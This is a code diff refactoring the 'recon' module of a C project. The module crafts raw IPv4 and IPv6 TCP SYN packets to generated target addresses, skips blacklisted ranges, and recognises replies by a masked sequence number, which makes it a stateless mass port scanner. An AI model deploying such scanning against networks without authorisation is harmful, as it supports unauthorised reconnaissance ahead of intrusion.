@@ -15,9 +15,6 @@
 
 #include <ifaddrs.h>
 #include <linux/if_ether.h>
-// TODO: Don't use these
-#include <linux/ip.h>
-#include <linux/ipv6.h>
 #include <linux/tcp.h>
 
 
@@ -374,20 +371,20 @@ static bool rcn_main_chk_blist (
 static void rcn_main_send_syn (prne_recon_t *ctx) {
 	prne_ipv_t ret;
 	uint8_t src[16], dst[16];
-	uint8_t m_head[prne_op_max(sizeof(struct iphdr), sizeof(struct ipv6hdr))];
-	uint8_t m_pkt[sizeof(m_head) + sizeof(struct tcphdr)];
+	uint8_t m_head[prne_op_max(sizeof(prne_iphdr4_t), sizeof(prne_iphdr6_t))];
+	uint8_t m_pkt[40 + sizeof(struct tcphdr)];
 	uint8_t m_sa[prne_op_max(
 		sizeof(struct sockaddr_in),
 		sizeof(struct sockaddr_in6))];
-	struct iphdr *ih4;
-	struct ipv6hdr *ih6;
+	prne_iphdr4_t *ih4;
+	prne_iphdr6_t *ih6;
 	struct sockaddr_in *sa4;
 	struct sockaddr_in6 *sa6;
 	socklen_t sl = 0;
 	struct tcphdr th;
 	size_t coin, pkt_len = 0;
 	uint16_t d_port;
-	int snd_flags = MSG_NOSIGNAL, f_ret, fd;
+	int snd_flags = MSG_NOSIGNAL, f_ret, fd = -1;
 
 	ret = rcn_main_gen_addr(ctx, src, dst, &snd_flags);
 	if (ret == PRNE_IPV_NONE || rcn_main_chk_blist(ctx, ret, dst)) {
@@ -409,17 +406,15 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 
 	switch (ret) {
 	case PRNE_IPV_4:
-		ih4 = (struct iphdr*)m_head;
-		ih4->version = 4;
+		ih4 = (prne_iphdr4_t*)m_head;
 		ih4->ihl = 5;
-		// filled in by kernel
-		// ih4->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+		ih4->total_len = 20 + sizeof(struct tcphdr);
 		// let kernel fill this in
 		// prne_rnd(&ctx->rnd, &ih4->id, sizeof(ih4->id));
 		ih4->ttl = 64;
 		ih4->protocol = IPPROTO_TCP;
-		memcpy(&ih4->saddr, src, 4);
-		memcpy(&ih4->daddr, dst, 4);
+		memcpy(ih4->saddr, src, 4);
+		memcpy(ih4->daddr, dst, 4);
 		// filled in by kernel
 		// ih4->check = htons(rcn_main_ih_chk(m_head, sizeof(struct iphdr)));
 
@@ -434,9 +429,9 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 			NULL,
 			0));
 
-		memcpy(m_pkt, ih4, sizeof(struct iphdr));
-		memcpy(m_pkt + sizeof(struct iphdr), &th, sizeof(struct tcphdr));
-		pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+		prne_ser_iphdr4(m_pkt, ih4);
+		memcpy(m_pkt + 20, &th, sizeof(struct tcphdr));
+		pkt_len = 20 + sizeof(struct tcphdr);
 
 		sa4 = (struct sockaddr_in*)m_sa;
 		sa4->sin_family = AF_INET;
@@ -449,8 +444,8 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 			char d_str[INET_ADDRSTRLEN];
 
 			prne_assert(
-				inet_ntop(AF_INET, &ih4->saddr, s_str, sizeof(s_str)) &&
-				inet_ntop(AF_INET, &ih4->daddr, d_str, sizeof(d_str)));
+				inet_ntop(AF_INET, ih4->saddr, s_str, sizeof(s_str)) &&
+				inet_ntop(AF_INET, ih4->daddr, d_str, sizeof(d_str)));
 			prne_dbgpf(
 				"Send SYN %s:%"PRIu16 " -> %s:%"PRIu16"\n",
 				s_str,
@@ -460,14 +455,16 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 		}
 		break;
 	case PRNE_IPV_6:
-		ih6 = (struct ipv6hdr*)m_head;
-		ih6->version = 6;
-		prne_rnd(&ctx->rnd, ih6->flow_lbl, 3);
-		ih6->payload_len = htons(sizeof(struct tcphdr));
-		ih6->nexthdr = IPPROTO_TCP;
+		ih6 = (prne_iphdr6_t*)m_head;
+		prne_rnd(
+			&ctx->rnd,
+			(uint8_t*)&ih6->flow_label,
+			sizeof(ih6->flow_label));
+		ih6->payload_len = sizeof(struct tcphdr);
+		ih6->next_hdr = IPPROTO_TCP;
 		ih6->hop_limit = 64;
-		memcpy(&ih6->saddr, src, 16);
-		memcpy(&ih6->daddr, dst, 16);
+		memcpy(ih6->saddr, src, 16);
+		memcpy(ih6->daddr, dst, 16);
 
 		th.seq =
 			prne_recmb_msb32(dst[0], dst[1], dst[2], dst[3]) ^
@@ -483,9 +480,9 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 			NULL,
 			0));
 
-		memcpy(m_pkt, ih6, sizeof(struct ipv6hdr));
-		memcpy(m_pkt + sizeof(struct ipv6hdr), &th, sizeof(struct tcphdr));
-		pkt_len = sizeof(struct ipv6hdr) + sizeof(struct tcphdr);
+		prne_ser_iphdr6(m_pkt, ih6);
+		memcpy(m_pkt + 40, &th, sizeof(struct tcphdr));
+		pkt_len = 40 + sizeof(struct tcphdr);
 
 		sa6 = (struct sockaddr_in6*)m_sa;
 		sa6->sin6_family = AF_INET6;
@@ -498,8 +495,8 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 			char d_str[INET6_ADDRSTRLEN];
 
 			prne_assert(
-				inet_ntop(AF_INET6, &ih6->saddr, s_str, sizeof(s_str)) &&
-				inet_ntop(AF_INET6, &ih6->daddr, d_str, sizeof(d_str)));
+				inet_ntop(AF_INET6, ih6->saddr, s_str, sizeof(s_str)) &&
+				inet_ntop(AF_INET6, ih6->daddr, d_str, sizeof(d_str)));
 			prne_dbgpf(
 				"Send SYN [%s]:%"PRIu16 " -> [%s]:%"PRIu16"\n",
 				s_str,
@@ -539,11 +536,11 @@ static void rcn_main_recv_syn_tail (
 static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 	int f_ret;
 	uint8_t buf[
-		sizeof(struct iphdr) +
+		20 +
 		60 + // options
 		sizeof(struct tcphdr)];
 	struct tcphdr th;
-	struct iphdr ih;
+	prne_iphdr4_t ih;
 	uint32_t exp_ack;
 	prne_net_endpoint_t ep;
 
@@ -563,11 +560,10 @@ static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 			}
 			break;
 		}
-		if ((size_t)f_ret < sizeof(struct iphdr))
-		{
+		if ((size_t)f_ret < 20) {
 			continue;
 		}
-		memcpy(&ih, buf, sizeof(struct iphdr));
+		prne_dser_iphdr4(buf, &ih);
 		if (ih.ihl * 4 + sizeof(struct tcphdr) > (size_t)f_ret) {
 			continue;
 		}
@@ -575,9 +571,15 @@ static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 
 		prne_memzero(&ep, sizeof(prne_net_endpoint_t));
 		ep.addr.ver = PRNE_IPV_4;
-		memcpy(ep.addr.addr, &ih.saddr, 4);
+		memcpy(ep.addr.addr, ih.saddr, 4);
 		ep.port = ntohs(th.source);
-		exp_ack = (ntohl(ih.saddr) ^ ctx->seq_mask) + 1;
+		exp_ack = prne_recmb_msb32(
+			ih.saddr[0],
+			ih.saddr[1],
+			ih.saddr[2],
+			ih.saddr[3]) ^
+			ctx->seq_mask;
+		exp_ack += 1;
 		rcn_main_recv_syn_tail(ctx, &th, exp_ack, &ep);
 	}
 }
@@ -585,7 +587,7 @@ static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 static void rcn_main_recv_syn6 (prne_recon_t *ctx) {
 	int f_ret;
 	uint8_t buf[1024];
-	struct ipv6hdr ih;
+	prne_iphdr6_t ih;
 	struct tcphdr th;
 	size_t ext_pos;
 	uint8_t next_hdr;
@@ -609,14 +611,13 @@ LOOP:
 			}
 			break;
 		}
-		if ((size_t)f_ret < sizeof(struct ipv6hdr))
-		{
+		if ((size_t)f_ret < 40) {
 			continue;
 		}
-		memcpy(&ih, buf, sizeof(struct ipv6hdr));
+		prne_dser_iphdr6(buf, &ih);
 
-		ext_pos = sizeof(struct ipv6hdr);
-		next_hdr = ih.nexthdr;
+		ext_pos = 40;
+		next_hdr = ih.next_hdr;
 		while (next_hdr != IPPROTO_TCP && ext_pos + 1 > (size_t)f_ret) {
 			switch (next_hdr) {
 			case 0:
@@ -629,19 +630,18 @@ LOOP:
 				ext_pos += buf[ext_pos + 1] * 8 + 8;
 				break;
 			case 59: // no next header
-			default: // can't understand this packet
+			default: // can't parse this packet
 				goto LOOP;
 			}
 		}
-		if ((size_t)f_ret < ext_pos + sizeof(struct tcphdr))
-		{
+		if ((size_t)f_ret < ext_pos + sizeof(struct tcphdr)) {
 			continue;
 		}
 		memcpy(&th, buf + ext_pos, sizeof(struct tcphdr));
 
 		prne_memzero(&ep, sizeof(prne_net_endpoint_t));
 		ep.addr.ver = PRNE_IPV_6;
-		memcpy(ep.addr.addr, &ih.saddr, 16);
+		memcpy(ep.addr.addr, ih.saddr, 16);
 		ep.port = ntohs(th.source);
 		exp_ack =
 			prne_recmb_msb32(
